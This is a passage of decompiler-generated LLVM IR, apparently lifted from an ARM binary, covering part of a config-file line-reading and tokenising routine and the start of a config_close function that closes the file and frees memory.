  store i32 %v4_157e4, i32* %r0.global-to-local, align 4
  %v0_157e8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a08

dec_label_pc_157f0:                               ; preds = %dec_label_pc_157b8
  %v2_157f0 = inttoptr i32 %v1_157d8 to i32*
  %v3_157f0 = load i32, i32* %v2_157f0, align 4
  store i32 %v3_157f0, i32* @r4, align 4
  %v1_157f4 = load i32, i32* @r6, align 4
  %v2_157f4 = add i32 %v1_157f4, %v3_157f0
  %v3_157f4 = inttoptr i32 %v2_157f4 to i8*
  store i32 %v2_157f4, i32* %r0.global-to-local, align 4
  %v3_157f8 = call i32 @strlen(i8* %v3_157f4)
  %v0_15800 = load i32, i32* @r6, align 4
  %v2_15800 = add i32 %v0_15800, %v3_157f8
  store i32 %v2_15800, i32* @r6, align 4
  %v0_15804 = load i32, i32* @r4, align 4
  store i32 %v0_15804, i32* @r0, align 4
  %v2_15808 = call i32 @__GI_strchr(i32 %v0_15804, i32 10)
  store i32 %v2_15808, i32* %r0.global-to-local, align 4
  %v2_1580c = icmp eq i32 %v2_15808, 0
  store i1 %v2_1580c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1580c, label %dec_label_pc_15838, label %dec_label_pc_15814

dec_label_pc_15814:                               ; preds = %dec_label_pc_157f0
  %v1_15814 = inttoptr i32 %v2_15808 to i8*
  %v2_15814 = load i8, i8* %v1_15814, align 1
  %v3_15814 = zext i8 %v2_15814 to i32
  %v1_15818 = add nuw nsw i32 %v3_15814, 255
  %v1_1581c = urem i32 %v1_15818, 256
  store i32 %v1_1581c, i32* %r3.global-to-local, align 4
  %v7_15820 = icmp eq i32 %v1_1581c, 92
  store i1 %v7_15820, i1* %cpsr_z.global-to-local, align 1
  %v1_15824 = trunc i32 %v1_15818 to i8
  store i8 %v1_15824, i8* %v1_15814, align 1
  %v0_15828 = load i32, i32* @r6, align 4
  %v1_15828 = add i32 %v0_15828, -1
  store i32 %v1_15828, i32* @r6, align 4
  %v0_1582c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1582c, label %dec_label_pc_15830, label %dec_label_pc_158bc

dec_label_pc_15830:                               ; preds = %dec_label_pc_15814
  %v1_15830 = add i32 %v0_15828, -2
  store i32 %v1_15830, i32* @r6, align 4
  br label %dec_label_pc_157b8

dec_label_pc_15838:                               ; preds = %dec_label_pc_157f0
  %v0_15838 = load i32, i32* @r5, align 4
  %v1_15838 = add i32 %v0_15838, 20
  %v2_15838 = inttoptr i32 %v1_15838 to i32*
  %v3_15838 = load i32, i32* %v2_15838, align 4
  store i32 %v3_15838, i32* %r3.global-to-local, align 4
  %v2_1583c = icmp eq i32 %v3_15838, 0
  store i1 %v2_1583c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1583c, label %dec_label_pc_15874, label %dec_label_pc_15844

dec_label_pc_15844:                               ; preds = %dec_label_pc_15838
  %v1_15844 = add i32 %v0_15838, 16
  %v2_15844 = inttoptr i32 %v1_15844 to i32*
  %v3_15844 = load i32, i32* %v2_15844, align 4
  store i32 %v3_15844, i32* %r3.global-to-local, align 4
  %v1_15848 = add i32 %v0_15838, 8
  %v2_15848 = inttoptr i32 %v1_15848 to i32*
  %v3_15848 = load i32, i32* %v2_15848, align 4
  %v1_1584c = add i32 %v3_15844, 4096
  store i32 %v1_1584c, i32* %r3.global-to-local, align 4
  %v2_15850 = add i32 %v3_15848, %v1_1584c
  store i32 %v1_1584c, i32* %v2_15844, align 4
  %v0_15858 = load i32, i32* @r5, align 4
  %v1_15858 = add i32 %v0_15858, 4
  %v2_15858 = inttoptr i32 %v1_15858 to i32*
  %v3_15858 = load i32, i32* %v2_15858, align 4
  store i32 %v3_15858, i32* %r0.global-to-local, align 4
  %v4_1585c = inttoptr i32 %v3_15858 to i32*
  %v5_1585c = call i32 @realloc(i32* %v4_1585c, i32 %v2_15850, i32 %v2_157c8, i32 %v1_1584c)
  store i32 %v5_1585c, i32* %r0.global-to-local, align 4
  %v0_15860 = load i32, i32* @r5, align 4
  %v1_15860 = add i32 %v0_15860, 8
  %v2_15860 = inttoptr i32 %v1_15860 to i32*
  %v3_15860 = load i32, i32* %v2_15860, align 4
  %v2_15864 = add i32 %v3_15860, %v5_1585c
  store i32 %v2_15864, i32* %r3.global-to-local, align 4
  %v2_15868 = add i32 %v0_15860, 12
  %v3_15868 = inttoptr i32 %v2_15868 to i32*
  store i32 %v2_15864, i32* %v3_15868, align 4
  %v1_1586c = load i32, i32* @r5, align 4
  %v2_1586c = add i32 %v1_1586c, 4
  %v3_1586c = inttoptr i32 %v2_1586c to i32*
  store i32 %v5_1585c, i32* %v3_1586c, align 4
  %v0_157c0.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_157b8

dec_label_pc_15874:                               ; preds = %dec_label_pc_15838, %.dec_label_pc_15874_crit_edge
  %v0_15874 = phi i32 [ %v0_15874.pre, %.dec_label_pc_15874_crit_edge ], [ %v0_15838, %dec_label_pc_15838 ]
  %v1_15874 = inttoptr i32 %v0_15874 to i32*
  %v2_15874 = load i32, i32* %v1_15874, align 4
  store i32 %v2_15874, i32* @r1, align 4
  %v1_15878 = add i32 %v2_15874, 52
  %v2_15878 = inttoptr i32 %v1_15878 to i32*
  %v3_15878 = load i32, i32* %v2_15878, align 4
  store i32 %v3_15878, i32* %r3.global-to-local, align 4
  %v2_1587c = icmp eq i32 %v3_15878, 0
  store i1 %v2_1587c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1587c, label %dec_label_pc_158a8, label %dec_label_pc_15884

dec_label_pc_15884:                               ; preds = %dec_label_pc_15874
  %v1_15884 = add i32 %v2_15874, 16
  %v2_15884 = inttoptr i32 %v1_15884 to i32*
  %v3_15884 = load i32, i32* %v2_15884, align 4
  store i32 %v3_15884, i32* %r2.global-to-local, align 4
  %v1_15888 = add i32 %v2_15874, 24
  %v2_15888 = inttoptr i32 %v1_15888 to i32*
  %v3_15888 = load i32, i32* %v2_15888, align 4
  store i32 %v3_15888, i32* %r3.global-to-local, align 4
  %v3_1588c = icmp ult i32 %v3_15884, %v3_15888
  %v9_1588c = icmp eq i32 %v3_15884, %v3_15888
  store i1 %v9_1588c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1588c, label %dec_label_pc_158b0thread-pre-split, label %dec_label_pc_1589c

dec_label_pc_1589c:                               ; preds = %dec_label_pc_15884
  store i32 %v2_15874, i32* %r0.global-to-local, align 4
  %v1_158a0 = inttoptr i32 %v2_15874 to i16*
  %v2_158a0 = call i32 @getc_unlocked(i16* %v1_158a0)
  store i32 %v2_158a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_158b0

dec_label_pc_158a8:                               ; preds = %dec_label_pc_15874
  store i32 %v2_15874, i32* %r0.global-to-local, align 4
  %v1_158ac = call i32 @__GI_fgetc(i32 %v2_15874)
  store i32 %v1_158ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_158b0

dec_label_pc_158b0thread-pre-split:               ; preds = %dec_label_pc_15884
  %v2_15890 = inttoptr i32 %v3_15884 to i8*
  %v3_15890 = load i8, i8* %v2_15890, align 1
  %v4_15890 = zext i8 %v3_15890 to i32
  store i32 %v4_15890, i32* %r0.global-to-local, align 4
  %v6_15890 = add i32 %v3_15884, 1
  store i32 %v6_15890, i32* %r2.global-to-local, align 4
  store i32 %v6_15890, i32* %v2_15884, align 4
  %v0_158b0.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_158b0

dec_label_pc_158b0:                               ; preds = %dec_label_pc_158b0thread-pre-split, %dec_label_pc_1589c, %dec_label_pc_158a8
  %v1_158b4 = phi i32 [ %v0_158b0.pr, %dec_label_pc_158b0thread-pre-split ], [ %v2_158a0, %dec_label_pc_1589c ], [ %v1_158ac, %dec_label_pc_158a8 ]
  %v7_158b0 = icmp eq i32 %v1_158b4, 10
  store i1 %v7_158b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_158b0, label %dec_label_pc_158bc.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_158b0
  %v8_158b4 = icmp eq i32 %v1_158b4, -1
  store i1 %v8_158b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_158b4, label %dec_label_pc_158bc.loopexit, label %.dec_label_pc_15874_crit_edge

.dec_label_pc_15874_crit_edge:                    ; preds = %bb66
  %v0_15874.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15874

dec_label_pc_158bc.loopexit:                      ; preds = %bb66, %dec_label_pc_158b0
  %v0_158bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_158bc

dec_label_pc_158bc:                               ; preds = %dec_label_pc_15814, %dec_label_pc_158bc.loopexit
  %v0_158bc = phi i32 [ %v0_158bc.pre, %dec_label_pc_158bc.loopexit ], [ %v1_15828, %dec_label_pc_15814 ]
  %v7_158bc = icmp eq i32 %v0_158bc, -1
  store i1 %v7_158bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_158bc, label %dec_label_pc_15a04, label %dec_label_pc_158c4

dec_label_pc_158c4:                               ; preds = %dec_label_pc_158bc
  store i32 %v1_1572c, i32* %r3.global-to-local, align 4
  store i1 %v2_158c8, i1* %cpsr_z.global-to-local, align 1
  %v0_158cc = load i32, i32* @r5, align 4
  %v1_158cc = add i32 %v0_158cc, 12
  %v2_158cc = inttoptr i32 %v1_158cc to i32*
  %v3_158cc = load i32, i32* %v2_158cc, align 4
  store i32 %v3_158cc, i32* @r4, align 4
  br i1 %v2_158c8, label %dec_label_pc_158e4, label %dec_label_pc_158d4

dec_label_pc_158d4:                               ; preds = %dec_label_pc_158c4
  store i32 %v3_158cc, i32* @r0, align 4
  %v0_158d8 = load i32, i32* @sl, align 4
  %v2_158dc = inttoptr i32 %v3_158cc to i8*
  %v3_158dc = call i32 @__GI_strspn(i8* %v2_158dc, i32 %v0_158d8)
  store i32 %v3_158dc, i32* %r0.global-to-local, align 4
  %v0_158e0 = load i32, i32* @r4, align 4
  %v2_158e0 = add i32 %v0_158e0, %v3_158dc
  store i32 %v2_158e0, i32* @r4, align 4
  br label %dec_label_pc_158e4

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158c4, %dec_label_pc_158d4
  %v0_158e4 = phi i32 [ %v3_158cc, %dec_label_pc_158c4 ], [ %v2_158e0, %dec_label_pc_158d4 ]
  %v1_158e4 = inttoptr i32 %v0_158e4 to i8*
  %v2_158e4 = load i8, i8* %v1_158e4, align 1
  %v3_158e4 = zext i8 %v2_158e4 to i32
  store i32 %v3_158e4, i32* %r2.global-to-local, align 4
  %v2_158e8 = icmp eq i8 %v2_158e4, 0
  store i1 %v2_158e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158e8, label %dec_label_pc_15754.backedge, label %dec_label_pc_158f0

dec_label_pc_15754.backedge:                      ; preds = %dec_label_pc_158e4, %dec_label_pc_158f0, %dec_label_pc_159fc
  %v0_15754.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15754

dec_label_pc_158f0:                               ; preds = %dec_label_pc_158e4
  %v0_158f0 = load i32, i32* @r7, align 4
  %v1_158f0 = inttoptr i32 %v0_158f0 to i8*
  %v2_158f0 = load i8, i8* %v1_158f0, align 1
  %v3_158f0 = zext i8 %v2_158f0 to i32
  store i32 %v3_158f0, i32* %r3.global-to-local, align 4
  %v9_158f4 = icmp eq i8 %v2_158f0, %v2_158e4
  store i1 %v9_158f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_158f4, label %dec_label_pc_15754.backedge, label %dec_label_pc_158fc

dec_label_pc_158fc:                               ; preds = %dec_label_pc_158f0
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_15900 = load i32, i32* @r5, align 4
  %v1_15900 = add i32 %v0_15900, 4
  %v2_15900 = inttoptr i32 %v1_15900 to i32*
  %v3_15900 = load i32, i32* %v2_15900, align 4
  store i32 %v3_15900, i32* %r0.global-to-local, align 4
  %v0_15904 = load i32, i32* @fp, align 4
  store i32 %v3_15900, i32* %v1_15920, align 4
  store i32 %v3_15718, i32* %r2.global-to-local, align 4
  %v3_15910 = inttoptr i32 %v3_15900 to i8*
  %v4_15910 = call i32 @__GI_memset(i8* %v3_15910, i32 %v0_15904, i32 %v3_15718)
  store i32 %v4_15910, i32* %r0.global-to-local, align 4
  %v0_15914 = load i32, i32* @fp, align 4
  store i32 %v0_15914, i32* @r6, align 4
  %v0_159d412 = load i32, i32* @r4, align 4
  %v1_159d413 = inttoptr i32 %v0_159d412 to i8*
  %v2_159d414 = load i8, i8* %v1_159d413, align 1
  %v3_159d415 = zext i8 %v2_159d414 to i32
  store i32 %v3_159d415, i32* %r2.global-to-local, align 4
  %v2_159d816 = icmp eq i8 %v2_159d414, 0
  store i1 %v2_159d816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159d816, label %dec_label_pc_159f0, label %dec_label_pc_159e0

dec_label_pc_1591c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15920 = load i32, i32* %v1_15920, align 4
  store i32 %v2_15920, i32* %r3.global-to-local, align 4
  store i32 %v1_15730, i32* %r2.global-to-local, align 4
  %v9_15928 = icmp eq i32 %v2_1592c, %v1_15730
  store i1 %v9_15928, i1* %cpsr_z.global-to-local, align 1
  %v5_1592c = mul i32 %v2_1592c, 4
  %v6_1592c = add i32 %v2_15920, %v5_1592c
  %v7_1592c = inttoptr i32 %v6_1592c to i32*
  store i32 %v0_1592c, i32* %v7_1592c, align 4
  br i1 %v9_15928, label %dec_label_pc_15934, label %dec_label_pc_15940

dec_label_pc_15934:                               ; preds = %dec_label_pc_1591c
  store i32 %v1_1573c, i32* %r3.global-to-local, align 4
  store i1 %v2_15938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15938, label %dec_label_pc_15940, label %dec_label_pc_15960

dec_label_pc_15940:                               ; preds = %dec_label_pc_15934, %dec_label_pc_1591c
  %v0_15940 = load i32, i32* @r7, align 4
  %v1_15940 = inttoptr i32 %v0_15940 to i8*
  %v2_15940 = load i8, i8* %v1_15940, align 1
  %v3_15940 = zext i8 %v2_15940 to i32
  store i32 %v3_15940, i32* %r3.global-to-local, align 4
  %v2_15944 = icmp eq i8 %v2_15940, 0
  store i1 %v2_15944, i1* %cpsr_z.global-to-local, align 1
  %v0_15948 = load i32, i32* @r4, align 4
  store i32 %v0_15948, i32* @r0, align 4
  %v1_1594c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15944, i32 %v1_1594c, i32 %v0_15940
  store i32 %storemerge, i32* @r1, align 4
  %v0_15954 = call i32 @strcspn()
  store i32 %v0_15954, i32* %r0.global-to-local, align 4
  %v0_15958 = load i32, i32* @r4, align 4
  %v2_15958 = add i32 %v0_15958, %v0_15954
  store i32 %v2_15958, i32* @r4, align 4
  br label %dec_label_pc_15998

dec_label_pc_15960:                               ; preds = %dec_label_pc_15934
  %v0_15960 = load i32, i32* @r4, align 4
  store i32 %v0_15960, i32* @r0, align 4
  %v0_15964 = load i32, i32* @r7, align 4
  %v1_15964 = inttoptr i32 %v0_15964 to i8*
  %v2_15964 = load i8, i8* %v1_15964, align 1
  %v3_15964 = zext i8 %v2_15964 to i32
  %v5_15968 = call i32 @__GI_strchrnul(i32 %v0_15960, i32 %v3_15964, i32 %v1_15730, i32 %v1_1573c)
  store i32 %v5_15968, i32* %r0.global-to-local, align 4
  store i32 %v1_1572c, i32* %r2.global-to-local, align 4
  store i1 %v2_158c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_15968, i32* @r4, align 4
  br i1 %v2_158c8, label %dec_label_pc_15998, label %dec_label_pc_15984

dec_label_pc_15980:                               ; preds = %dec_label_pc_15984
  %v1_15980 = add i32 %v0_15998.pre, -1
  store i32 %v1_15980, i32* @r4, align 4
  br label %dec_label_pc_15984

dec_label_pc_15984:                               ; preds = %dec_label_pc_15960, %dec_label_pc_15980
  %v0_15984 = phi i32 [ %v1_15980, %dec_label_pc_15980 ], [ %v5_15968, %dec_label_pc_15960 ]
  %v1_15984 = add i32 %v0_15984, -1
  %v2_15984 = inttoptr i32 %v1_15984 to i8*
  %v3_15984 = load i8, i8* %v2_15984, align 1
  %v4_15984 = zext i8 %v3_15984 to i32
  %v0_15988 = load i32, i32* @sl, align 4
  store i32 %v0_15988, i32* @r0, align 4
  %v2_1598c = call i32 @__GI_strchr(i32 %v0_15988, i32 %v4_15984)
  store i32 %v2_1598c, i32* %r0.global-to-local, align 4
  %v2_15990 = icmp eq i32 %v2_1598c, 0
  store i1 %v2_15990, i1* %cpsr_z.global-to-local, align 1
  %v0_15998.pre = load i32, i32* @r4, align 4
  br i1 %v2_15990, label %dec_label_pc_15998, label %dec_label_pc_15980

dec_label_pc_15998:                               ; preds = %dec_label_pc_15984, %dec_label_pc_15960, %dec_label_pc_15940
  %v3_159a4 = phi i32 [ %v5_15968, %dec_label_pc_15960 ], [ %v2_15958, %dec_label_pc_15940 ], [ %v0_15998.pre, %dec_label_pc_15984 ]
  %v1_15998 = inttoptr i32 %v3_159a4 to i8*
  %v2_15998 = load i8, i8* %v1_15998, align 1
  %v3_15998 = zext i8 %v2_15998 to i32
  store i32 %v3_15998, i32* %r2.global-to-local, align 4
  %v0_1599c = load i32, i32* @r7, align 4
  %v1_1599c = inttoptr i32 %v0_1599c to i8*
  %v2_1599c = load i8, i8* %v1_1599c, align 1
  %v3_1599c = zext i8 %v2_1599c to i32
  store i32 %v3_1599c, i32* %r3.global-to-local, align 4
  %v9_159a0 = icmp eq i8 %v2_1599c, %v2_15998
  store i1 %v9_159a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_159a0, label %bb69, label %dec_label_pc_159ac

bb69:                                             ; preds = %dec_label_pc_15998
  %v1_159a4 = load i32, i32* @fp, align 4
  %v2_159a4 = trunc i32 %v1_159a4 to i8
  store i8 %v2_159a4, i8* %v1_15998, align 1
  %v0_159a8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_159a8.pr, label %bb71, label %.dec_label_pc_159ac_crit_edge

.dec_label_pc_159ac_crit_edge:                    ; preds = %bb69
  %v0_159ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_159ac

dec_label_pc_159ac:                               ; preds = %.dec_label_pc_159ac_crit_edge, %dec_label_pc_15998
  %v0_159ac = phi i32 [ %v0_159ac.pre, %.dec_label_pc_159ac_crit_edge ], [ %v3_15998, %dec_label_pc_15998 ]
  %v2_159ac = icmp eq i32 %v0_159ac, 0
  store i1 %v2_159ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159ac, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_159ac
  %v1_159b0 = load i32, i32* @fp, align 4
  %v2_159b0 = trunc i32 %v1_159b0 to i8
  %v3_159b0 = load i32, i32* @r4, align 4
  %v4_159b0 = inttoptr i32 %v3_159b0 to i8*
  store i8 %v2_159b0, i8* %v4_159b0, align 1
  %v5_159b0 = load i32, i32* @r4, align 4
  %v6_159b0 = add i32 %v5_159b0, 1
  store i32 %v6_159b0, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_159ac, %bb70
  %v2_159b4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_159b4, i32* %r3.global-to-local, align 4
  %v2_159b8 = icmp eq i32 %v2_159b4, 0
  store i1 %v2_159b8, i1* %cpsr_z.global-to-local, align 1
  %v0_159d4.pre = load i32, i32* @r4, align 4
  br i1 %v2_159b8, label %dec_label_pc_159d0, label %dec_label_pc_159c0

dec_label_pc_159c0:                               ; preds = %bb71
  store i32 %v0_159d4.pre, i32* @r0, align 4
  %v0_159c4 = load i32, i32* @sl, align 4
  %v2_159c8 = inttoptr i32 %v0_159d4.pre to i8*
  %v3_159c8 = call i32 @__GI_strspn(i8* %v2_159c8, i32 %v0_159c4)
  store i32 %v3_159c8, i32* %r0.global-to-local, align 4
  %v0_159cc = load i32, i32* @r4, align 4
  %v2_159cc = add i32 %v0_159cc, %v3_159c8
  store i32 %v2_159cc, i32* @r4, align 4
  br label %dec_label_pc_159d0

dec_label_pc_159d0:                               ; preds = %bb71, %dec_label_pc_159c0
  %v0_159d4 = phi i32 [ %v2_159cc, %dec_label_pc_159c0 ], [ %v0_159d4.pre, %bb71 ]
  %v0_159d0 = load i32, i32* @r6, align 4
  %v1_159d0 = add i32 %v0_159d0, 1
  store i32 %v1_159d0, i32* @r6, align 4
  %v1_159d4 = inttoptr i32 %v0_159d4 to i8*
  %v2_159d4 = load i8, i8* %v1_159d4, align 1
  %v3_159d4 = zext i8 %v2_159d4 to i32
  store i32 %v3_159d4, i32* %r2.global-to-local, align 4
  %v2_159d8 = icmp eq i8 %v2_159d4, 0
  store i1 %v2_159d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159d8, label %dec_label_pc_159f0, label %dec_label_pc_159e0

dec_label_pc_159e0:                               ; preds = %dec_label_pc_158fc, %dec_label_pc_159d0
  %v0_1592c = phi i32 [ %v0_159d4, %dec_label_pc_159d0 ], [ %v0_159d412, %dec_label_pc_158fc ]
  %v2_1592c = phi i32 [ %v1_159d0, %dec_label_pc_159d0 ], [ %v0_15914, %dec_label_pc_158fc ]
  %v1_159e4 = phi i32 [ %v3_159d4, %dec_label_pc_159d0 ], [ %v3_159d415, %dec_label_pc_158fc ]
  %v0_159e0 = load i32, i32* @r7, align 4
  %v1_159e0 = inttoptr i32 %v0_159e0 to i8*
  %v2_159e0 = load i8, i8* %v1_159e0, align 1
  %v3_159e0 = zext i8 %v2_159e0 to i32
  store i32 %v3_159e0, i32* %r3.global-to-local, align 4
  %v9_159e4 = icmp eq i32 %v3_159e0, %v1_159e4
  store i1 %v9_159e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_159e4, label %dec_label_pc_159f0, label %bb72

bb72:                                             ; preds = %dec_label_pc_159e0
  %v2_159e8 = load i32, i32* @sb, align 4
  %v3_159e8 = sub i32 %v2_1592c, %v2_159e8
  %v5_159e8 = xor i32 %v2_159e8, %v2_1592c
  %v6_159e8 = xor i32 %v3_159e8, %v2_1592c
  %v7_159e8 = and i32 %v6_159e8, %v5_159e8
  %v8_159e8 = icmp slt i32 %v7_159e8, 0
  %v9_159e8 = icmp slt i32 %v3_159e8, 0
  %v10_159e8 = icmp eq i32 %v2_1592c, %v2_159e8
  store i1 %v10_159e8, i1* %cpsr_z.global-to-local, align 1
  %v2_159ec = xor i1 %v9_159e8, %v8_159e8
  br i1 %v2_159ec, label %dec_label_pc_1591c, label %dec_label_pc_159f0

dec_label_pc_159f0:                               ; preds = %dec_label_pc_159e0, %dec_label_pc_159d0, %bb72, %dec_label_pc_158fc
  %v0_159f4 = phi i32 [ %v0_15914, %dec_label_pc_158fc ], [ %v2_1592c, %dec_label_pc_159e0 ], [ %v1_159d0, %dec_label_pc_159d0 ], [ %v2_1592c, %bb72 ]
  store i32 %v3_15714, i32* %r2.global-to-local, align 4
  %v9_159f4 = icmp eq i32 %v0_159f4, %v3_15714
  store i1 %v9_159f4, i1* %cpsr_z.global-to-local, align 1
  %v6_159f8 = icmp slt i32 %v0_159f4, %v3_15714
  br i1 %v6_159f8, label %dec_label_pc_159fc, label %dec_label_pc_15a08

dec_label_pc_159fc:                               ; preds = %dec_label_pc_159f0
  %v0_159fc = load i32, i32* @r8, align 4
  %v1_159fc = and i32 %v0_159fc, 1048576
  %v2_159fc = icmp eq i32 %v1_159fc, 0
  store i1 %v2_159fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159fc, label %dec_label_pc_15754.backedge, label %dec_label_pc_15a04

dec_label_pc_15a04:                               ; preds = %dec_label_pc_159fc, %dec_label_pc_158bc, %.thread, %entry
  br label %dec_label_pc_15a08

dec_label_pc_15a08:                               ; preds = %dec_label_pc_159f0, %dec_label_pc_157d8, %dec_label_pc_15a04
  %v0_15a08 = phi i32 [ %v0_157e8, %dec_label_pc_157d8 ], [ 0, %dec_label_pc_15a04 ], [ %v0_159f4, %dec_label_pc_159f0 ]
  store i32 %v0_15a08, i32* %r0.global-to-local, align 4
  store i32 %v3_156f0, i32* @r4, align 4
  store i32 %v6_156f0, i32* @r5, align 4
  store i32 %v9_156f0, i32* @r6, align 4
  store i32 %v12_156f0, i32* @r7, align 4
  store i32 %v15_156f0, i32* @r8, align 4
  store i32 %v18_156f0, i32* @sb, align 4
  store i32 %v21_156f0, i32* @sl, align 4
  store i32 %v24_156f0, i32* @fp, align 4
  ret i32 %v0_15a08

; uselistorder directives
  uselistorder i32 %v0_15a08, { 1, 0 }
  uselistorder i32 %v0_159f4, { 0, 2, 1 }
  uselistorder i32 %v3_159e8, { 1, 0 }
  uselistorder i32 %v2_159e8, { 1, 0, 2 }
  uselistorder i32 %v2_1592c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_159d4.pre, { 0, 2, 1 }
  uselistorder i32 %v5_15968, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15914, { 1, 0, 2 }
  uselistorder i1 %v9_158f4, { 1, 0 }
  uselistorder i32 %v3_158cc, { 0, 2, 1, 3 }
  uselistorder i1 %v7_158bc, { 1, 0 }
  uselistorder i1 %v8_158b4, { 1, 0 }
  uselistorder i32 %v3_15884, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_15874, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_1585c, { 1, 0, 2 }
  uselistorder i32 %v1_1584c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15838, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15830, { 1, 0 }
  uselistorder i32 %v1_1581c, { 1, 0 }
  uselistorder i32 %v1_15818, { 1, 0 }
  uselistorder i32 %v2_157f4, { 1, 0 }
  uselistorder i32 %v1_157d8, { 2, 0, 1 }
  uselistorder i32 %v0_157c0, { 1, 0 }
  uselistorder i32 %v1_157b0, { 0, 2, 1 }
  uselistorder i32* %v1_15920, { 1, 0 }
  uselistorder i1 %v2_158c8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1573c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15730, { 2, 1, 0 }
  uselistorder i32 %v3_15718, { 1, 2, 0 }
  uselistorder i32 %v3_15714, { 2, 1, 0 }
  uselistorder i32 %v1_1570c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15a08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_159f0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_159e0, { 1, 0 }
  uselistorder label %dec_label_pc_159d0, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15984, { 1, 0 }
  uselistorder label %dec_label_pc_15754.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_158e4, { 1, 0 }
  uselistorder label %dec_label_pc_158bc, { 1, 0 }
  uselistorder label %dec_label_pc_158b0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15874, { 1, 0 }
  uselistorder label %dec_label_pc_157a8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15a1c = icmp eq i32* %arg1, null
  br i1 %v2_15a1c, label %dec_label_pc_15a44, label %dec_label_pc_15a24

dec_label_pc_15a24:                               ; preds = %entry
  %v2_15a24 = load i32, i32* %arg1, align 4
  %v1_15a28 = inttoptr i32 %v2_15a24 to i16*
  %v2_15a28 = call i32 @__GI_fclose(i16* %v1_15a28)
  %v0_15a2c = load i32, i32* @r4, align 4
  %v1_15a2c = add i32 %v0_15a2c, 20
  %v2_15a2c = inttoptr i32 %v1_15a2c to i32*
  %v3_15a2c = load i32, i32* %v2_15a2c, align 4
  %v2_15a30 = icmp eq i32 %v3_15a2c, 0
  br i1 %v2_15a30, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15a24
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15a24, %bb
  store i32 88636, i32* @lr, align 4
  %v1_15a38 = xor i1 %v2_15a30, true
  call void @__pseudo_cond_branch(i1 %v1_15a38, i32 ptrtoint (i32* @global_var_1310c.34 to i32))
  %v0_15a3c = load i32, i32* @r4, align 4
  store i32 %v0_15a3c, i32* @r0, align 4
  %v0_15a40 = call i32 @free()
  br label %dec_label_pc_15a44

